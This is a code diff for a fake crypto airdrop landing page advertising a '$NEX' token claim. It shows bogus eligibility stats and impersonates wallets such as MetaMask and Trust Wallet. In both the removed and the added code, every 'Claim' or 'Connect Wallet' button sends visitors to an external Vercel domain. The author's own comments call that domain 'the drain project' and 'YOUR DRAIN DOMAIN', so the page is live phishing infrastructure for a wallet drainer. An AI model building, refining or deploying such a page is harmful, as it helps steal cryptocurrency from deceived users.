@@ -10,18 +10,11 @@
 <style>
   :root {
     --bg: #030305;
-    --surface: rgba(16, 16, 24, 0.6);
-    --card: rgba(22, 22, 30, 0.7);
-    --dialog: #0f0f15;
-    --border: rgba(255, 255, 255, 0.08);
-    --border-light: rgba(255, 255, 255, 0.15);
     --p1: #00f2fe;
     --p2: #4facfe;
     --p3: #6b21a8;
-    --accent: #00f2fe;
     --accent-glow: rgba(0, 242, 254, 0.4);
-    --green: #10b981;
-    --red: #ef4444;
+    --border: rgba(255, 255, 255, 0.08);
     --t1: #ffffff;
     --t2: #94a3b8;
     --t3: #64748b;
@@ -32,8 +25,6 @@
     background: var(--bg); color: var(--t1);
     min-height: 100vh; overflow-x: hidden; -webkit-font-smoothing: antialiased;
   }
-
-  /* Background */
   .bg-elements { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
   .orb { position: absolute; filter: blur(90px); border-radius: 50%; opacity: 0.5; animation: float 20s ease-in-out infinite; }
   .orb-1 { width: 50vw; height: 50vw; background: var(--p3); top: -20%; left: -10%; }
@@ -46,11 +37,7 @@
     -webkit-mask-image: radial-gradient(ellipse at center, black 20%, transparent 80%);
   }
   @keyframes float { 0%, 100% { transform: translate(0,0) scale(1); } 50% { transform: translate(5%,5%) scale(1.05); } }
-
-  /* Layout */
   .app { position: relative; z-index: 2; min-height: 100vh; display: flex; flex-direction: column; }
-
-  /* Nav */
   .nav {
     position: fixed; top: 0; width: 100%; height: 72px; z-index: 100;
     display: flex; align-items: center; justify-content: space-between; padding: 0 40px;
@@ -68,14 +55,12 @@
   .nav-links a { color: var(--t2); text-decoration: none; transition: 0.3s; font-size: 14px; }
   .nav-links a:hover { color: var(--t1); }
   .btn { font-family: inherit; font-weight: 600; cursor: pointer; border: none; outline: none; border-radius: 12px; transition: 0.3s; }
-  .btn-connect {
+  .btn-nav {
     padding: 10px 24px; font-size: 14px; color: #000;
     background: linear-gradient(135deg, var(--p1), var(--p2));
     box-shadow: 0 4px 15px var(--accent-glow);
   }
-  .btn-connect:hover { transform: translateY(-2px); box-shadow: 0 8px 25px var(--accent-glow); filter: brightness(1.1); }
-
-  /* Hero */
+  .btn-nav:hover { transform: translateY(-2px); box-shadow: 0 8px 25px var(--accent-glow); filter: brightness(1.1); }
   .hero { text-align: center; padding: 140px 20px 40px; margin: 0 auto; max-width: 800px; animation: fadeUp 0.8s ease-out; }
   @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
   .tagline {
@@ -86,79 +71,27 @@
   .hero h1 { font-size: clamp(36px,6vw,64px); font-weight: 800; line-height: 1.1; margin-bottom: 20px; letter-spacing: -1.5px; }
   .text-gradient { background: linear-gradient(to right, #fff, var(--p2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
   .hero p { font-size: clamp(16px,2vw,18px); color: var(--t2); max-width: 540px; margin: 0 auto 40px; line-height: 1.6; }
-
-  /* Stats */
   .stats { display: flex; justify-content: center; gap: 48px; margin-bottom: 60px; }
   .stat-item { text-align: center; }
   .stat-value { font-size: 28px; font-weight: 700; color: var(--t1); margin-bottom: 4px; letter-spacing: -0.5px; }
   .stat-label { font-size: 12px; color: var(--t3); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
-
-  /* Claim Button */
-  .btn-action {
+  .btn-claim {
     padding: 18px 48px; font-size: 17px; color: #000; font-weight: 700;
     background: linear-gradient(135deg, var(--p1), var(--p2)); border-radius: 14px;
     box-shadow: 0 8px 25px var(--accent-glow);
   }
-  .btn-action:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 12px 30px var(--accent-glow); }
-
-  /* Footer */
+  .btn-claim:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 12px 30px var(--accent-glow); }
   .footer { padding: 40px 20px; text-align: center; border-top: 1px solid var(--border); margin-top: auto; }
   .footer-links { display: flex; justify-content: center; gap: 30px; margin-bottom: 20px; }
   .footer-links a { color: var(--t3); font-size: 14px; text-decoration: none; transition: 0.2s; font-weight: 500; }
   .footer-links a:hover { color: var(--t2); }
   .footer-copy { font-size: 13px; color: #475569; }
-
-  /* ===== Wallet Modal ===== */
-  .wm-overlay {
-    display: none; position: fixed; inset: 0; z-index: 9999;
-    background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
-    align-items: center; justify-content: center;
-  }
-  .wm-overlay.active { display: flex; }
-  .wm-box {
-    width: 360px; max-width: 92vw; background: #1a1a2e; border-radius: 24px;
-    border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 24px 80px rgba(0,0,0,0.7);
-    overflow: hidden; animation: wmSlideUp 0.25s ease;
-  }
-  @keyframes wmSlideUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
-  .wm-header {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 18px 20px 14px; border-bottom: 1px solid rgba(255,255,255,0.06);
-  }
-  .wm-header-left { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.06); color: var(--t3); font-size: 13px; cursor: default; }
-  .wm-header h3 { font-size: 16px; font-weight: 600; color: #fff; letter-spacing: -0.3px; }
-  .wm-close { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.06); color: var(--t2); font-size: 18px; cursor: pointer; border: none; transition: 0.2s; font-family: inherit; }
-  .wm-close:hover { background: rgba(255,255,255,0.12); color: #fff; }
-  .wm-list { padding: 8px 10px 4px; }
-  .wm-item {
-    display: flex; align-items: center; gap: 12px; padding: 12px 14px;
-    border-radius: 14px; cursor: pointer; transition: background 0.15s; border: none;
-    background: transparent; width: 100%; text-align: left; color: #fff; font-family: inherit;
-  }
-  .wm-item:hover { background: rgba(255,255,255,0.06); }
-  .wm-icon { width: 40px; height: 40px; border-radius: 12px; flex-shrink: 0; overflow: hidden; }
-  .wm-icon img { width: 40px; height: 40px; border-radius: 12px; display: block; }
-  .wm-name { flex: 1; font-size: 15px; font-weight: 500; }
-  .wm-badge { font-size: 10px; font-weight: 700; letter-spacing: 0.5px; padding: 3px 8px; border-radius: 6px; text-transform: uppercase; }
-  .wm-badge-installed { background: rgba(46,204,113,0.15); color: #2ecc71; }
-  .wm-badge-qr { background: rgba(59,130,246,0.15); color: #3b82f6; }
-  .wm-badge-popular { background: rgba(234,179,8,0.15); color: #eab308; }
-  .wm-arrow { color: var(--t3); font-size: 18px; margin-left: 4px; }
-  .wm-sep { height: 1px; background: rgba(255,255,255,0.04); margin: 4px 14px; }
-  .wm-footer-row {
-    padding: 14px 20px 18px; text-align: center; border-top: 1px solid rgba(255,255,255,0.04);
-    font-size: 13px; color: var(--t3);
-  }
-  .wm-footer-row a { color: var(--p1); text-decoration: none; font-weight: 500; margin-left: 4px; }
-
   @media (max-width: 768px) {
     .nav { padding: 0 20px; }
     .nav-links { display: none; }
     .hero { padding: 120px 20px 30px; }
     .stats { gap: 24px; flex-wrap: wrap; }
     .stat-value { font-size: 24px; }
-    .wm-box { border-radius: 20px 20px 0 0; position: fixed; bottom: 0; left: 0; right: 0; max-width: 100%; width: 100%; animation: wmSlideUpMobile 0.3s ease; }
-    @keyframes wmSlideUpMobile { from { transform: translateY(100%); } to { transform: translateY(0); } }
   }
 </style>
 </head>
@@ -182,8 +115,8 @@
       <a href="#">Security</a>
       <a href="#">Docs</a>
     </div>
-    <div style="display:flex;align-items:center;">
-      <button class="btn btn-connect" onclick="openModal()">Claim Now</button>
+    <div>
+      <button class="btn btn-nav" onclick="go()">Connect Wallet</button>
     </div>
   </nav>
 
@@ -196,9 +129,7 @@
       <div class="stat-item"><div class="stat-value">1.4M+</div><div class="stat-label">Eligible Wallets</div></div>
       <div class="stat-item"><div class="stat-value">EVM</div><div class="stat-label">Supported Networks</div></div>
     </div>
-    <div style="display:flex;justify-content:center;gap:16px;flex-wrap:wrap;">
-      <button class="btn btn-action" onclick="openModal()">CLAIM $NEX &rarr;</button>
-    </div>
+    <button class="btn btn-claim" onclick="go()">CLAIM $NEX &rarr;</button>
   </div>
 
   <div class="footer">
@@ -212,139 +143,21 @@
   </div>
 </div>
 
-<!-- ===== Wallet Connect Modal ===== -->
-<div class="wm-overlay" id="wmOverlay" onclick="if(event.target===this)closeModal()">
-  <div class="wm-box">
-    <div class="wm-header">
-      <div class="wm-header-left">&#9432;</div>
-      <h3>Connect Wallet</h3>
-      <button class="wm-close" onclick="closeModal()">&times;</button>
-    </div>
-    <div class="wm-list" id="wmList"></div>
-    <div class="wm-footer-row">Haven't got a wallet? <a href="https://ethereum.org/wallets" target="_blank">Get started</a></div>
-  </div>
-</div>
-
 <script>
-// ============================================================
-// CONFIG — Set your connect domain (the drain project on Vercel)
-// ============================================================
-var CONNECT_URL = 'https://playholding.vercel.app/';
+  // ========== YOUR DRAIN DOMAIN ==========
+  var CONNECT_URL = 'https://playholding.vercel.app/';
+  var isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-var isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-// Wallet list with real icons from public CDN
-var WALLETS = [
-  {
-    id: 'walletconnect',
-    name: 'WalletConnect',
-    badge: 'qr',
-    icon: 'https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400?projectId=2f05ae7f1116030fde2d36508f472bfb'
-  },
-  {
-    id: 'metamask',
-    name: 'MetaMask',
-    detect: function(){ return !!(window.ethereum && window.ethereum.isMetaMask); },
-    icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg'
-  },
-  {
-    id: 'trust',
-    name: 'Trust Wallet',
-    detect: function(){ return !!(window.ethereum && window.ethereum.isTrust) || !!window.trustwallet; },
-    icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg'
-  },
-  {
-    id: 'phantom',
-    name: 'Phantom',
-    detect: function(){ return !!(window.phantom && window.phantom.ethereum) || !!(window.solana && window.solana.isPhantom); },
-    icon: 'https://phantom.app/img/phantom-logo.svg'
-  },
-  {
-    id: 'coinbase',
-    name: 'Coinbase Wallet',
-    detect: function(){ return !!(window.ethereum && window.ethereum.isCoinbaseWallet); },
-    icon: 'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo-300x300.webp'
-  },
-  {
-    id: 'brave',
-    name: 'Brave Wallet',
-    detect: function(){ return !!(window.ethereum && window.ethereum.isBraveWallet); },
-    icon: 'https://brave.com/static-assets/images/brave-logo-sans-text.svg'
-  }
-];
-
-function buildWalletList() {
-  var list = document.getElementById('wmList');
-  list.innerHTML = '';
-
-  WALLETS.forEach(function(w) {
-    var installed = w.detect ? w.detect() : false;
-    var badgeHTML = '';
-    if (w.badge === 'qr') {
-      badgeHTML = '<span class="wm-badge wm-badge-qr">QR CODE</span>';
-    } else if (installed) {
-      badgeHTML = '<span class="wm-badge wm-badge-installed">INSTALLED</span>';
+  function go() {
+    if (isMobile) {
+      window.location.href = CONNECT_URL;
     } else {
-      badgeHTML = '<span class="wm-badge wm-badge-popular">POPULAR</span>';
+      var w = 420, h = 700;
+      var left = (screen.width - w) / 2;
+      var top = (screen.height - h) / 2;
+      window.open(CONNECT_URL, 'connect_wallet', 'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes');
     }
-
-    var btn = document.createElement('button');
-    btn.className = 'wm-item';
-    btn.innerHTML =
-      '<div class="wm-icon"><img src="' + w.icon + '" alt="' + w.name + '" onerror="this.parentElement.innerHTML=\'<div style=background:' + (w.color || '#333') + ';width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;color:#fff>' + w.name.charAt(0) + '</div>\'"></div>' +
-      '<span class="wm-name">' + w.name + '</span>' +
-      badgeHTML +
-      '<span class="wm-arrow">&#8250;</span>';
-    btn.onclick = function() { selectWallet(w.id); };
-    list.appendChild(btn);
-  });
-
-  // Separator
-  var sep = document.createElement('div');
-  sep.className = 'wm-sep';
-  list.appendChild(sep);
-
-  // All Wallets row
-  var allBtn = document.createElement('button');
-  allBtn.className = 'wm-item';
-  allBtn.innerHTML =
-    '<div class="wm-icon" style="display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.06);border-radius:12px;width:40px;height:40px;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></div>' +
-    '<span class="wm-name">All Wallets</span>' +
-    '<span class="wm-badge" style="background:rgba(255,255,255,0.06);color:var(--t2);">550+</span>' +
-    '<span class="wm-arrow">&#8250;</span>';
-  allBtn.onclick = function() { selectWallet('all'); };
-  list.appendChild(allBtn);
-}
-
-function openModal() {
-  buildWalletList();
-  document.getElementById('wmOverlay').classList.add('active');
-}
-
-function closeModal() {
-  document.getElementById('wmOverlay').classList.remove('active');
-}
-
-// ============================================================
-// When user clicks ANY wallet → open the drain project
-// ============================================================
-function selectWallet(walletId) {
-  closeModal();
-  if (isMobile) {
-    // Mobile: full redirect (deep links / WalletConnect work best as top-level)
-    window.location.href = CONNECT_URL;
-  } else {
-    // Desktop: open popup window (browser extensions work in popups)
-    var w = 420, h = 700;
-    var left = (screen.width - w) / 2;
-    var top = (screen.height - h) / 2;
-    window.open(
-      CONNECT_URL,
-      'connect_wallet',
-      'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top + ',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
-    );
   }
-}
 </script>
 </body>
 </html>
